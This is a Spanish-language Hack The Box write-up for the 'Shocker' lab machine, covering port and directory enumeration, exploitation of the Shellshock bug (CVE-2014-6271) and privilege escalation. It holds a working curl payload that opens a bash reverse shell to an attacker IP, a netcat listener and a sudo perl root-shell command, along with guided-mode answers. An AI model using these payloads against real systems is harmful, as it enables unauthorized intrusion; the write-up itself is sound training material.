---
title: Writeup shocker - Hack The Box - Resolución y Análisis
published: true
tags:
  - hackthebox
  - writeup
  - shocker
  - ciberseguridad
  - pentesting
description: Writeup y resolución de la máquina shocker en Hack The Box.
keywords:
  - writeup shocker
  - hack the box shocker
  - resolución máquina shocker
  - shocker hack the box
  - htb shocker
---
------
### 🔗 Accesos rápidos

- 📄 **Writeup online**: [Link](https://publish.obsidian.md/bunzopy/HTB/Facil/Linux/Shocker)
- 📺 **Resolución en vivo (completa)**: [Parte1](https://www.youtube.com/watch?v=vaxNMG6xigI)|[Parte2](https://www.youtube.com/watch?v=o5cVkovAiAY)
- 🧠 **Explicación resumida**: [Link](https://www.youtube.com/watch?v=gTelKKOMDQw)

--------

#easy #linux #nmap #ping #shellshock #tratamientotty #reverseshell #whatweb #wappalyzer #sudo-l #CVE-2014-6271

-------
# Guided Mode

1)¿Cuántos puertos TCP están a la escucha en Shocker?
	2

2)¿Cuál es el nombre del directorio disponible en el servidor web que es un nombre estándar conocido por ejecutar scripts a través de la interfaz de puerta de enlace común?
	cgi-bin

3)¿Cómo se llama el script del directorio cgi-bin?
	user.sh

4)Pregunta opcional: ¿El resultado de user.sh coincide con el resultado de qué comando estándar de Linux?
	uptime

5)¿Qué CVE ID de 2014 describe una vulnerabilidad de ejecución remota de código en Bash cuando se invoca a través de Apache CGI?
	CVE-2014-6271

6)¿Con qué usuario se ejecuta el servidor web en Shocker?
	shelly

*La pregunta anterior era la flag de user.txt*
8)¿Qué binario puede ejecutar el usuario shelly como root en Shocker?
	perl

-----
# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]

```shell
ping -c 1 10.10.10.56 
nmap -p- --open -vvv -sS --min-rate 5000 -n -Pn 10.10.10.56 -oG allPorts
extractPorts allPorts
nmap -sCV -p80,2222 10.10.10.56 -oN target
```

![[Shocker4.png]]
![[Shocker5.png]]
*TLL:* Maquina linux
*Puertos:*
	`80` HTPP
	`2222` [[ssh]]

------
# [[Whatweb-wappalyzer]]

```shell
whatweb http://10.10.10.56
```
![[Shocker3.png]]
![[Shocker6.png]]
No obtenemos ninguna informacion relevante

-------------
# [[Gobuster]]

```shell
gobuster dir -u http://10.10.10.56 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt --add-slash -t 64
```

![[Shocker8.png]]

Nos da que existe un directorio http://10.10.10.56/cgi-bin/

Ahora aplicamos enumeracion en este directorio buscando archivos con extension  ``.sh .pl .cgi`` 

```shell
gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -x sh,pl,cgi -t 64
```

![[Shocker9.png]]

Y da que en el directorio *cgi-bin* hay un archivo *user.sh*   `http://10.10.10.56/cgi-bin/user.sh`

-------
# [[NMAP Scripts]]

Como estamos ante el directorio *cgi-bin*, ejecutamos un comando de enumaracion de shellshock de `nmap` poniendo el archivo de *user.sh* que encontramos antes:
```shell
nmap -p80 10.10.10.56 --script http-shellshock --script-args uri=/cgi-bin/user.sh
```

![[Shocker2.png]]
Nos indica que es vulnerable a [[CVE-2014-6271]]

---------
# Explotacion [[CVE-2014-6271]] y [[Reverse shell]]

[Articulo de shellshock](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/cgi.html)
Vamos a usar [[curl]] con el comando `curl -s -X GET "http://10.10.10.56/cgi-bin/user.sh" -H "User-Agent: () { :; };echo;echo; /bin/bash -i >& /dev/tcp/10.10.16.6/443 0>&1"`
	se pone el ;echo;echo para separar el payload malioso del comando `curl -s -X GET "http://10.10.10.56/cgi-bin/user.sh" -H "User-Agent: () { :; }/bin/bash -i >& /dev/tcp/10.10.16.6/443 0>&1"`

Ahora nos vamos a poner en escucha con [[nc -nlvp 443]]
![[Imagenes/Shocker1.png]]
Ya ganamos acceso a la maquina

-----
# [[Tratamiento de la TTY]]

---
# Escalada de privilegios con [[Abuso de Sudo]]

```shell
sudo -l
```

![[Shocker10.png]]

Se puede ejecutar el binario de */usr/bin/perl*, con privilegio de root sin contraseña. 
Asi que vamos a la pagina de [gtfobins](https://gtfobins.github.io/gtfobins/perl/#sudo) y nos da un comando para ejecutar una bash con privilegios

![[Shocker11.png]]

```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
```

Y como se puede apreciar, ya somos root, y podemos catear las flags
![[Shocker12.png]]

# Notas

--------

Me paso que si no ejecutaba el script de nmap, no se me ejecutaba el payload, no me llegaba la revershell


-------
# 📚Creditos

[Writeup de Bast1an1c](https://bast1ant1c.github.io/shocker/#)  
Writeup oficial de HTB
